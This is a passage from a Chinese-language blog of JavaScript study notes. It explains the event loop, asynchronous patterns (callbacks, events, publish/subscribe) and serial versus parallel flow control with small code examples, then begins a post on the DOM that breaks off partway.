<p>这种模式的<strong>好处</strong>是<strong>实现起来比较简单，执行环境相对单纯</strong>；<strong>坏处</strong>是<strong>只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行</strong>。常见的浏览器无响应（假死），往往就是因为某一段 JavaScript 代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。JavaScript 语言本身并不慢，慢的是读写外部数据，比如等待 Ajax 请求返回结果。这个时候，如果对方服务器迟迟没有响应，或者网络不通畅，就会导致脚本的长时间停滞。</p>
<p>如果排队是因为计算量大，CPU 忙不过来，倒也算了，但是很多时候 CPU 是闲着的，因为 <strong>IO 操作（输入输出）</strong>很慢（比如 Ajax 操作从网络读取数据），不得不等着结果出来，再往下执行。JavaScript 语言的设计者意识到，这时 CPU 完全可以不管 IO 操作，<strong>挂起处于等待中的任务，先运行排在后面的任务。等到 IO 操作返回了结果，再回过头，把挂起的任务继续执行下去</strong>。这种机制就是 JavaScript 内部采用的<strong>“事件循环”机制（Event Loop）</strong>。</p>
<p>单线程模型虽然对 JavaScript 构成了很大的限制，但也因此使它具备了其他语言不具备的优势。如果用得好，JavaScript 程序是不会出现堵塞的，这就是为什么 <strong>Node 可以用很少的资源，应付大流量访问</strong>的原因。</p>
<p>为了利用多核 CPU 的计算能力，<strong>HTML5 提出 Web Worker 标准</strong>，允许 JavaScript 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 DOM。所以，这个新标准并没有改变 JavaScript 单线程的本质。</p>
<h3 id="2、同步任务和异步任务"><a href="#2、同步任务和异步任务" class="headerlink" title="2、同步任务和异步任务"></a>2、同步任务和异步任务</h3><p>程序里面所有的任务，可以<strong>分成两类：同步任务（synchronous）和异步任务（asynchronous）</strong>。</p>
<p><strong>同步任务是那些没有被引擎挂起、在主线程上排队执行的任务</strong>。只有前一个任务执行完毕，才能执行后一个任务。</p>
<p><strong>异步任务是那些被引擎放在一边，不进入主线程、而进入任务队列的任务</strong>。只有引擎认为某个异步任务可以执行了（比如 Ajax 操作从服务器得到了结果），<strong>该任务（采用回调函数的形式）才会进入主线程执行</strong>。排在异步任务后面的代码，不用等待异步任务结束会马上运行，也就是说，异步任务不具有“堵塞”效应。</p>
<p>举例来说，<strong>Ajax 操作可以当作同步任务处理，也可以当作异步任务处理，由开发者决定</strong>。如果是同步任务，主线程就等着 Ajax 操作返回结果，再往下执行；如果是异步任务，主线程在发出 Ajax 请求以后，就直接往下执行，等到 Ajax 操作有了结果，主线程再执行对应的回调函数。</p>
<h3 id="3、任务队列和事件循环"><a href="#3、任务队列和事件循环" class="headerlink" title="3、任务队列和事件循环"></a>3、任务队列和事件循环</h3><p>JavaScript 运行时，除了一个正在运行的主线程，引擎还提供一个<strong>任务队列</strong>（task queue），<strong>里面是各种需要当前程序处理的异步任务</strong>。（实际上，根据异步任务的类型，存在多个任务队列。为了方便理解，这里假设只存在一个队列。）</p>
<p>首先，主线程会去执行所有的同步任务。等到同步任务全部执行完，就会去看任务队列里面的异步任务。如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。</p>
<p><strong>异步任务的写法通常是回调函数</strong>。一旦异步任务重新进入主线程，就会执行对应的回调函数。如果一个异步任务没有回调函数，就不会进入任务队列，也就是说，不会重新进入主线程，因为没有用回调函数指定下一步的操作。</p>
<p>JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？答案就是<strong>引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了</strong>。这种循环检查的机制，就叫做<strong>事件循环（Event Loop）</strong>。<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Event_loop">维基百科</a>的定义是：“事件循环是一个程序结构，用于等待和发送消息和事件（a programming construct that waits for and dispatches events or messages in a program）”。</p>
<h3 id="4、异步操作的模式"><a href="#4、异步操作的模式" class="headerlink" title="4、异步操作的模式"></a>4、异步操作的模式</h3><h4 id="（1）回调函数"><a href="#（1）回调函数" class="headerlink" title="（1）回调函数"></a>（1）回调函数</h4><p> 回调函数<strong>是异步操作最基本的方法。</strong> </p>
<p>下面是两个函数<code>f1</code>和<code>f2</code>，编程的意图是<code>f2</code>必须等到<code>f1</code>执行完成，才能执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123; <span class="comment">// 此函数是异步操作</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123; <span class="comment">// 期望是等f1执行完再执行f2，但是f1是异步操作，会先执行f2</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f1</span>();</span><br><span class="line"><span class="title function_">f2</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码的问题在于，如果<code>f1</code>是异步操作，<code>f2</code>会立即执行，不会等到<code>f1</code>结束再执行。</p>
<p>这时，可以考虑改写<code>f1</code>，把<code>f2</code>写成<code>f1</code>的回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="title function_">callback</span>(); <span class="comment">// f2传入当成回调函数，等f1执行完再执行f2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f1</span>(f2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优点：简单、容易理解和实现</span></span><br><span class="line"><span class="comment">// 缺点：不利于代码的阅读和维护，各个部分之间高度耦合，使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。</span></span><br></pre></td></tr></table></figure>

<p>回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Coupling_(computer_programming)">耦合</a>（coupling），使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。</p>
<h4 id="（2）事件监听"><a href="#（2）事件监听" class="headerlink" title="（2）事件监听"></a>（2）事件监听</h4><p> 另一种思路是采用事件驱动模式。<strong>异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生</strong>。 </p>
<p>还是以<code>f1</code>和<code>f2</code>为例。首先，为<code>f1</code>绑定一个事件（这里采用的 jQuery 的<a target="_blank" rel="noopener" href="https://api.jquery.com/on/">写法</a>）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1.<span class="title function_">on</span>(<span class="string">&#x27;done&#x27;</span>, f2);<span class="comment">// done事件被执行后，就执行f2</span></span><br></pre></td></tr></table></figure>

<p>上面这行代码的意思是，当<code>f1</code>发生<code>done</code>事件，就执行<code>f2</code>。然后，对<code>f1</code>进行改写：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="comment">// 异步任务</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    f1.<span class="title function_">trigger</span>(<span class="string">&#x27;done&#x27;</span>); <span class="comment">// trigger表示触发事件done</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优点：比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以去耦合，有利于实现模块化。</span></span><br><span class="line"><span class="comment">// 缺点：整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>f1.trigger(&#39;done&#39;)</code>表示，执行完成后，立即触发<code>done</code>事件，从而开始执行<code>f2</code>。</p>
<p>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Decoupling">去耦合</a>”（decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。</p>
<h4 id="（3）发布-订阅"><a href="#（3）发布-订阅" class="headerlink" title="（3）发布&#x2F;订阅"></a>（3）发布&#x2F;订阅</h4><p>事件完全可以理解成“信号”，如果存在一个“信号中心”，某个任务执行完成，就向信号中心“发布”（publish）一个信号，其他任务可以向信号中心“订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Publish-subscribe_pattern">发布&#x2F;订阅模式</a>”（publish-subscribe pattern），又称“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Observer_pattern">观察者模式</a>”（observer pattern）。</p>
<p>这个模式有多种<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/magazine/hh201955.aspx">实现</a>，下面采用的是 Ben Alman 的 <a target="_blank" rel="noopener" href="https://gist.github.com/661855">Tiny Pub&#x2F;Sub</a>，这是 jQuery 的一个插件。</p>
<p>首先，<code>f2</code>向信号中心<code>jQuery</code>订阅<code>done</code>信号。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jQuery.<span class="title function_">subscribe</span>(<span class="string">&#x27;done&#x27;</span>, f2);<span class="comment">// 订阅done信号，收到信号执行f2</span></span><br></pre></td></tr></table></figure>

<p>然后，<code>f1</code>进行如下改写。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    jQuery.<span class="title function_">publish</span>(<span class="string">&#x27;done&#x27;</span>); <span class="comment">// 发布done信号</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>jQuery.publish(&#39;done&#39;)</code>的意思是，<code>f1</code>执行完成后，向信号中心<code>jQuery</code>发布<code>done</code>信号，从而引发<code>f2</code>的执行。</p>
<p><code>f2</code>完成执行后，可以取消订阅（unsubscribe）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jQuery.<span class="title function_">unsubscribe</span>(<span class="string">&#x27;done&#x27;</span>, f2); <span class="comment">// 取消订阅done信号</span></span><br></pre></td></tr></table></figure>

<p>这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。</p>
<h3 id="5、异步操作的流程控制"><a href="#5、异步操作的流程控制" class="headerlink" title="5、异步操作的流程控制"></a>5、异步操作的流程控制</h3><p>如果有<strong>多个异步操作，就存在一个流程控制的问题</strong>：如何确定异步操作执行的顺序，以及如何保证遵守这种顺序。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">async</span>(<span class="params">arg, callback</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">callback</span>(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码的<code>async</code>函数是一个异步任务，非常耗时，每次执行需要1秒才能完成，然后再调用回调函数。</p>
<p>如果有六个这样的异步任务，需要全部完成后，才能执行最后的<code>final</code>函数。请问应该如何安排操作流程？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">final</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">async</span>(<span class="number">1</span>, <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="title function_">async</span>(<span class="number">2</span>, <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="title function_">async</span>(<span class="number">3</span>, <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">      <span class="title function_">async</span>(<span class="number">4</span>, <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="title function_">async</span>(<span class="number">5</span>, <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">          <span class="title function_">async</span>(<span class="number">6</span>, final);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 参数为 1 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 2 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 3 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 4 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 5 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 6 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 完成:  12</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，六个回调函数的嵌套，不仅写起来麻烦，容易出错，而且难以维护。</p>
<h4 id="（1）串行执行"><a href="#（1）串行执行" class="headerlink" title="（1）串行执行"></a>（1）串行执行</h4><p>我们可以编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。这就叫串行执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> items = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> results = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">async</span>(<span class="params">arg, callback</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">callback</span>(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">final</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">series</span>(<span class="params">item</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(item) &#123;</span><br><span class="line">    <span class="title function_">async</span>( item, <span class="keyword">function</span>(<span class="params">result</span>) &#123;</span><br><span class="line">      results.<span class="title function_">push</span>(result);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">series</span>(items.<span class="title function_">shift</span>());</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// results =&gt; [2,4,6,8,10,12]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">final</span>(results[results.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">series</span>(items.<span class="title function_">shift</span>());</span><br></pre></td></tr></table></figure>

<p>上面代码中，函数<code>series</code>就是串行函数，它会依次执行异步任务，所有任务都完成后，才会执行<code>final</code>函数。<code>items</code>数组保存每一个异步任务的参数，<code>results</code>数组保存每一个异步任务的运行结果。</p>
<p>注意，<strong>上面的写法需要六秒，才能完成整个脚本</strong>。</p>
<h4 id="（2）并行执行"><a href="#（2）并行执行" class="headerlink" title="（2）并行执行"></a>（2）并行执行</h4><p>流程控制函数也可以是并行执行，即所有异步任务同时执行，等到全部完成以后，才执行<code>final</code>函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> items = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> results = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">async</span>(<span class="params">arg, callback</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">callback</span>(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">final</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">items.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">  <span class="title function_">async</span>(item, <span class="keyword">function</span>(<span class="params">result</span>)&#123;</span><br><span class="line">    results.<span class="title function_">push</span>(result);</span><br><span class="line">    <span class="keyword">if</span>(results.<span class="property">length</span> === items.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="title function_">final</span>(results[results.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>forEach</code>方法会同时发起六个异步任务，等到它们全部完成以后，才会执行<code>final</code>函数。</p>
<p>相比而言，<strong>上面的写法只要一秒</strong>，就能完成整个脚本。这就是说，并行执行的效率较高，比起串行执行一次只能执行一个任务，较为节约时间。但是问题在于如果并行的<strong>任务较多，很容易耗尽系统资源</strong>，拖慢运行速度。因此有了第三种流程控制方式。</p>
<h4 id="（3）并行与串行的结合"><a href="#（3）并行与串行的结合" class="headerlink" title="（3）并行与串行的结合"></a>（3）并行与串行的结合</h4><p>所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行<code>n</code>个异步任务，这样就避免了过分占用系统资源。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> items = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> results = [];</span><br><span class="line"><span class="keyword">var</span> running = <span class="number">0</span>; <span class="comment">// 用于计算正在执行的任务数</span></span><br><span class="line"><span class="keyword">var</span> limit = <span class="number">2</span>; <span class="comment">// 最多可以有几个任务执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">async</span>(<span class="params">arg, callback</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">callback</span>(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">final</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">launcher</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">while</span>(running &lt; limit &amp;&amp; items.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> item = items.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="title function_">async</span>(item, <span class="keyword">function</span>(<span class="params">result</span>) &#123;</span><br><span class="line">      results.<span class="title function_">push</span>(result);</span><br><span class="line">      running--;</span><br><span class="line">      <span class="keyword">if</span>(items.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_">launcher</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(running == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_">final</span>(results);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    running++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">launcher</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，最多只能同时运行两个异步任务。变量<code>running</code>记录当前正在运行的任务数，只要低于门槛值，就再启动一个新的任务，如果等于<code>0</code>，就表示所有任务都执行完了，这时就执行<code>final</code>函数。</p>
<p>这段代码需要三秒完成整个脚本，处在串行执行和并行执行之间。<strong>通过调节<code>limit</code>变量，达到效率和资源的最佳平衡</strong>。</p>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>学习文档：<a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/pages/d61b1cb4cdac1f63" data-id="cm2n1iusu000b9sr35nc33glf" data-title="异步操作" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-05.DOM" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/pages/7d961b8030c6099e" class="article-date">
  <time class="dt-published" datetime="2020-01-12T03:49:16.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E3%80%8AJavaScript%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《JavaScript教程》笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/pages/7d961b8030c6099e">DOM</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1、DOM"><a href="#1、DOM" class="headerlink" title="1、DOM"></a>1、DOM</h3><p><strong>DOM 是 JavaScript 操作网页的接口</strong>，全称为“<strong>文档对象模型</strong>”（Document Object Model）。它的<strong>作用</strong>是<strong>将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作</strong>（比如增删内容）。</p>
<p>浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。</p>
<p>DOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。后面介绍的就是 JavaScript 对 DOM 标准的实现和用法。</p>
<h3 id="2、节点"><a href="#2、节点" class="headerlink" title="2、节点"></a>2、节点</h3><p><strong>DOM 的最小组成单位叫做节点（node）</strong>。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。</p>
<p>节点的类型有七种。</p>
<ul>
<li><code>Document</code>：整个文档树的顶层节点</li>
<li><code>DocumentType</code>：<code>doctype</code>标签（比如<code>&lt;!DOCTYPE html&gt;</code>）</li>
<li><code>Element</code>：网页的各种HTML标签（比如<code>&lt;body&gt;</code>、<code> &lt;a&gt; </code>等）</li>
<li><code>Attribute</code>：网页元素的属性（比如<code>class=&quot;right&quot;</code>）</li>
<li><code>Text</code>：标签之间或标签包含的文本</li>
<li><code>Comment</code>：注释</li>
<li><code>DocumentFragment</code>：文档的片段</li>
</ul>
<p>浏览器提供一个原生的节点对象<code>Node</code>，上面这七种节点都继承了<code>Node</code>，因此具有一些共同的属性和方法。</p>
<h3 id="3、节点树"><a href="#3、节点树" class="headerlink" title="3、节点树"></a>3、节点树</h3><p>一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树。它有一个顶层节点，下一层都是顶层节点的子节点，然后子节点又有自己的子节点，就这样层层衍生出一个金字塔结构，倒过来就像一棵树。</p>
<p>浏览器原生提供<code>document</code>节点，代表整个文档。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span></span><br><span class="line"><span class="comment">// 整个文档树</span></span><br></pre></td></tr></table></figure>

<p>文档的第一层有两个节点，第一个是文档类型节点（<code>&lt;!doctype html&gt;</code>），第二个是 HTML 网页的顶层容器标签<code>&lt;html&gt;</code>。后者构成了树结构的根节点（root node），其他 HTML 标签节点都是它的下级节点。</p>
<p>除了根节点，其他节点都有三种层级关系。</p>
<ul>
<li>父节点关系（parentNode）：直接的那个上级节点</li>
